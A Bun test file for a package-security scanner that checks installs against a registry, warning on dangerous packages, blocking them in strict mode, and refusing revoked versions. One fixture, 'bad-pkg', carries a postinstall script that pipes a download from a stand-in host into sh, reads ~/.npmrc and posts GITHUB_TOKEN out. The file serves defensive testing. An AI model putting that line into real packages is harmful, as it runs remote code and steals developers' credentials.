// Spec: with one bunfig line, stock `bun install` / `bun add` consult the registry and refuse
// revoked or dangerous versions. This is the Bun-first path: no wrapper needed.
import { describe, test, expect, beforeAll, afterAll } from "bun:test";
import { mkdtempSync, writeFileSync, cpSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { startRegistry, addUser, makeSandbox, writePackage, writeConsumer, writeProjectConfig, run, installedVersion, ROOT, type Registry, type RunResult } from "./harness";

const DAY = 24 * 60 * 60 * 1000;
let clock = Date.parse("2026-02-01T00:00:00Z");
let reg: Registry;
let apmUser: string;
let alice: string;
let work: string;

async function publish(name: string, version: string, token: string, extra: Partial<Parameters<typeof writePackage>[1]> = {}): Promise<void> {
  const sb = makeSandbox(reg, token);
  const d = writePackage(work, { name, version, ...extra }, reg, token);
  const r = await run(["bun", "publish"], { cwd: d, env: sb.env });
  if (r.code !== 0) throw new Error(`publish ${name}@${version} failed: ${r.out}`);
}

function scannedApp(deps: Record<string, string> = {}): string {
  const app = writeConsumer(work, reg, alice, deps);
  writeFileSync(join(app, "bunfig.toml"), `[install]\nregistry = { url = "${reg.url}", token = "${alice}" }\n\n[install.security]\nscanner = "@apm/bun-scanner"\n`);
  return app;
}

beforeAll(async () => {
  reg = await startRegistry({ now: () => clock });
  apmUser = await addUser(reg, "apm");
  alice = await addUser(reg, "alice");
  work = mkdtempSync(join(tmpdir(), "apm-scan-"));
  // publish the scanner package from this repo to the test registry
  const src = join(ROOT, "packages", "bun-scanner");
  const dst = mkdtempSync(join(work, "scanner-"));
  cpSync(src, dst, { recursive: true, filter: (p) => !p.includes("node_modules") });
  const pj: unknown = JSON.parse(readFileSync(join(dst, "package.json"), "utf8"));
  writeFileSync(join(dst, "package.json"), JSON.stringify({ ...Object(pj), private: false, publishConfig: { access: "public" } }, null, 2));
  writeProjectConfig(dst, reg, apmUser);
  const sb = makeSandbox(reg, apmUser);
  const p = await run(["bun", "publish"], { cwd: dst, env: sb.env });
  if (p.code !== 0) throw new Error(`scanner publish failed: ${p.out}`);

  await publish("good-pkg", "1.0.0", alice);
  await publish("bad-pkg", "1.0.0", alice, {
    scripts: { postinstall: "node p.js" },
    files: { "index.js": "module.exports=1;\n", "p.js": "require('child_process').execSync('curl https://e.example.com | sh'); require('fs').readFileSync(require('os').homedir()+'/.npmrc'); fetch('https://e.example.com',{method:'POST',body:process.env.GITHUB_TOKEN}); eval('1');\n" },
  });
  await publish("soon-revoked", "1.0.0", alice);
  clock += 10 * DAY;
});
afterAll(async () => {
  await reg?.stop();
});

describe("@apm/bun-scanner with stock bun", () => {
  test("bun add of a clean package passes the scanner", async () => {
    const sb = makeSandbox(reg, alice);
    const app = scannedApp();
    const s = await run(["bun", "add", "-d", "@apm/bun-scanner"], { cwd: app, env: sb.env });
    expect(s.code, s.out).toBe(0);
    const r = await run(["bun", "add", "good-pkg"], { cwd: app, env: sb.env });
    expect(r.code, r.out).toBe(0);
    expect(installedVersion(app, "good-pkg")).toBe("1.0.0");
  });

  // a score informs, it does not block (the owner's policy, 2026-11): outside a terminal the warning is printed and
  // bun goes on; APM_SCANNER_STRICT=1 cancels the install, as the default did before
  test("bun add of a dangerous package warns with the reason and installs; strict mode cancels it", async () => {
    const sb = makeSandbox(reg, alice);
    const app = scannedApp();
    const s = await run(["bun", "add", "-d", "@apm/bun-scanner"], { cwd: app, env: sb.env });
    expect(s.code, s.out).toBe(0);
    const warned = await run(["bun", "add", "bad-pkg"], { cwd: app, env: sb.env });
    expect(warned.code, warned.out).toBe(0);
    expect(warned.out).toMatch(/apm scanner: warning: bad-pkg@1\.0\.0: scores \d+\/100/);
    expect(installedVersion(app, "bad-pkg")).toBe("1.0.0");
    const strictApp = scannedApp();
    expect((await run(["bun", "add", "-d", "@apm/bun-scanner"], { cwd: strictApp, env: sb.env })).code).toBe(0);
    const r = await run(["bun", "add", "bad-pkg"], { cwd: strictApp, env: { ...sb.env, APM_SCANNER_STRICT: "1" } });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("bad-pkg");
    expect(r.out.toLowerCase()).toMatch(/score|install-script/);
    expect(installedVersion(strictApp, "bad-pkg")).toBeNull();
  });

  test("bun install refuses a lockfile that contains a version revoked after it was locked", async () => {
    const sb = makeSandbox(reg, alice);
    const app = scannedApp();
    const s = await run(["bun", "add", "-d", "@apm/bun-scanner"], { cwd: app, env: sb.env });
    expect(s.code, s.out).toBe(0);
    const a = await run(["bun", "add", "soon-revoked"], { cwd: app, env: sb.env });
    expect(a.code, a.out).toBe(0);
    const rv = await fetch(`${reg.url}-/apm/v1/revoke`, {
      method: "POST",
      headers: { "content-type": "application/json", authorization: `Bearer ${alice}` },
      body: JSON.stringify({ name: "soon-revoked", version: "1.0.0", reason: "compromised publish token", password: "correct-horse-battery" }),
    });
    expect(rv.status).toBe(200);
    // a 10-day-old version goes to revoke-pending first; the scanner treats pending as fatal too
    const r = await run(["bun", "install"], { cwd: app, env: sb.env });
    expect(r.code).not.toBe(0);
    expect(r.out).toContain("compromised publish token");
  });
});

// The scanner module itself, run the way bun runs it (in a bun process, with that process's env and cwd).
const SCANNER = join(ROOT, "packages", "bun-scanner", "src", "index.ts");

type Pkg = { name: string; version: string; tarball: string; requestedRange: string };

function scanIn(input: { cwd: string; env: Record<string, string>; packages: Pkg[] }): Promise<RunResult> {
  const code = `const { scanner } = await import(${JSON.stringify(SCANNER)}); console.log(JSON.stringify(await scanner.scan({ packages: ${JSON.stringify(input.packages)} })));`;

  return run(["bun", "-e", code], { cwd: input.cwd, env: input.env });
}

/** A directory whose bunfig.toml names `registry` (or none), and an env without APM_REGISTRY whose HOME has no bunfig. */
function scanSetup(registry: string | null) {
  const cwd = mkdtempSync(join(work, "scan-cwd-"));

  if (registry) writeFileSync(join(cwd, "bunfig.toml"), `[install]\nregistry = "${registry}"\n`);

  const { APM_REGISTRY: _r, ...env } = makeSandbox(reg).env;

  return { cwd, env: { ...env, HOME: mkdtempSync(join(work, "scan-home-")), XDG_CONFIG_HOME: mkdtempSync(join(work, "scan-xdg-")) } };
}

function pkg(name: string, tarball: string): Pkg {
  return { name, version: "1.0.0", tarball, requestedRange: "1.0.0" };
}

describe("@apm/bun-scanner trusts only the configured registry", () => {
  test("finding 6: a tarball URL on another host does not choose who is asked, and is reported", async () => {
    const seen: string[] = [];

    const spy = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch(req) {
        seen.push(new URL(req.url).pathname);

        return Response.json({ error: "not found" }, { status: 404 });
      },
    });

    const { cwd, env } = scanSetup(reg.url);
    const r = await scanIn({ cwd, env, packages: [pkg("bad-pkg", `${spy.url}bad-pkg/-/bad-pkg-1.0.0.tgz`)] });

    await spy.stop(true);
    expect(seen).toEqual([]);
    expect(r.code, r.out).toBe(0);
    // the configured registry answered (its warning), and the other host is reported
    expect(r.stderr).toContain("apm scanner: warning: bad-pkg@1.0.0: scores");
    expect(r.stderr).toContain("not checked: bad-pkg@1.0.0");
  });

  test("finding 7: a tarball URL without <name>/-/ is still checked against the configured registry", async () => {
    const { cwd, env } = scanSetup(reg.url);
    const r = await scanIn({ cwd, env, packages: [pkg("bad-pkg", `${reg.url}tarballs/bad-pkg-1.0.0.tgz`)] });

    expect(r.code, r.out).toBe(0);
    expect(r.stderr).toContain("apm scanner: warning: bad-pkg@1.0.0: scores");
  });

  test("finding 7: with no registry configured every package is reported, and strict mode cancels", async () => {
    const { cwd, env } = scanSetup(null);
    const packages = [pkg("good-pkg", "https://downloads.example.test/good-pkg-1.0.0.tgz")];
    const r = await scanIn({ cwd, env, packages });

    expect(r.code, r.out).toBe(0);
    expect(r.stderr).toContain("not checked: good-pkg@1.0.0");
    const strict = await scanIn({ cwd, env: { ...env, APM_SCANNER_STRICT: "1" }, packages });

    expect(strict.code, strict.out).not.toBe(0);
  });

  test("finding 8: an unreachable registry warns once per unchecked package, and strict mode cancels", async () => {
    const gone = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch: () => new Response("") });
    const deadUrl = gone.url.toString();

    await gone.stop(true);
    const { cwd, env } = scanSetup(deadUrl);
    const packages = [pkg("good-pkg", `${deadUrl}good-pkg/-/good-pkg-1.0.0.tgz`), pkg("soon-revoked", `${deadUrl}soon-revoked/-/soon-revoked-1.0.0.tgz`)];
    const r = await scanIn({ cwd, env, packages });

    expect(r.code, r.out).toBe(0);
    expect(r.stderr).toContain("not checked: good-pkg@1.0.0");
    expect(r.stderr).toContain("not checked: soon-revoked@1.0.0");
    const strict = await scanIn({ cwd, env: { ...env, APM_SCANNER_STRICT: "1" }, packages });

    expect(strict.code, strict.out).not.toBe(0);
  });

  test("finding 8: the README tells CI to run the scanner in strict mode", () => {
    const readme = readFileSync(join(ROOT, "packages", "bun-scanner", "README.md"), "utf8");

    expect(readme).toMatch(/APM_SCANNER_STRICT=1 bun install/);
  });
});
